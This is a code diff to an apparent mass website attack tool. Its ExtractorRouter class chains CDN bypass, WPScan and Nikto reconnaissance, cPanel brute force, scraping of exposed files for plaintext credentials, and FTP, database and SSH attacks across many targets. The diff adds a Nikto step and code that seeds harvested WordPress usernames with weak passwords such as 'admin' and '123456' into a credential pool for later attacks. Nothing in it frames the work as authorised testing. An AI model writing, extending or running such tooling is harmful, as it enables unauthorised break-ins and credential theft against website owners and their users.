@@ -22,10 +22,10 @@ class ExtractorRouter:
     def run(self):
         """Iterate all targets running extractors in priority order:
         1. CDN bypass
-        2. cPanel brute force (fast, gives full access)
-        3. Config scraper (find plaintext creds in exposed files)
-        4. FTP / MySQL / PostgreSQL
-        5. SSH only as last resort if nothing else worked
+        2. WPScan + Nikto (recon — find vulns, plugins, exposed files)
+        3. cPanel brute force (fast, gives full access)
+        4. Config scraper (find plaintext creds in exposed files)
+        5. FTP / MySQL / PostgreSQL / SSH
         """
         for domain_id, data in list(self.results.items()):
             ip = data['ip']
@@ -35,11 +35,12 @@ class ExtractorRouter:
             # 1. CDN bypass
             self._run_cdn_bypass(domain_id, ip, host)
 
-            # 2. WPScan / Nikto recon (HTTP/HTTPS only)
+            # 2. Web recon (WPScan + Nikto) — runs before any brute force
             if self._has_port(data, 80) or self._has_port(data, 443):
                 port = 443 if self._has_port(data, 443) else 80
                 self._run_wpscan(domain_id, ip, host, port)
-                
+                self._run_nikto(domain_id, ip, host, port)
+
             # 3. cPanel brute force
             if self._has_port(data, 2083):
                 self._run_cpanel(domain_id, ip, host)
@@ -92,21 +93,42 @@ class ExtractorRouter:
                 self.scanner._scan_target(f"{domain_id}_origin", host, origin_ip)
                 self.scanner._export_json()
 
-
     def _run_wpscan(self, domain_id: str, ip: str, host: str, port: int):
+        """Run WPScan recon and inject discovered usernames into credential pool.
+
+        Args:
+            domain_id (str): Target identifier.
+            ip (str): Target IP.
+            host (str): Domain name.
+            port (int): HTTP/HTTPS port.
+        """
         from src.utils.extractors.wpscan_extractor import WPScanExtractor
         extractor = WPScanExtractor(ip=ip, host=host, port=port)
         result = extractor.run()
         if result['status'] == 'success':
             self.results[domain_id]['wpscan'] = result
-            # Inject discovered usernames into credential pool for subsequent attacks
-            if result['users']:
+            # Inject discovered WP usernames into credential pool for subsequent attacks
+            if result.get('users'):
                 self.found_credentials.setdefault(domain_id, [])
                 for user in result['users']:
                     for pwd in ['', 'admin', '123456', user]:
                         self.found_credentials[domain_id].insert(0, (user, pwd))
+                print(f"  [ROUTER] Injected {len(result['users'])} WPScan user(s) into credential pool")
 
+    def _run_nikto(self, domain_id: str, ip: str, host: str, port: int):
+        """Run Nikto web vulnerability scan and store findings.
 
+        Args:
+            domain_id (str): Target identifier.
+            ip (str): Target IP.
+            host (str): Domain name.
+            port (int): HTTP/HTTPS port.
+        """
+        from src.utils.extractors.nikto_extractor import NiktoExtractor
+        extractor = NiktoExtractor(ip=ip, host=host, port=port)
+        result = extractor.run()
+        if result['status'] == 'success':
+            self.results[domain_id]['nikto'] = result
 
     def _run_cpanel(self, domain_id: str, ip: str, host: str):
         """Run cPanel brute force and store found credentials.
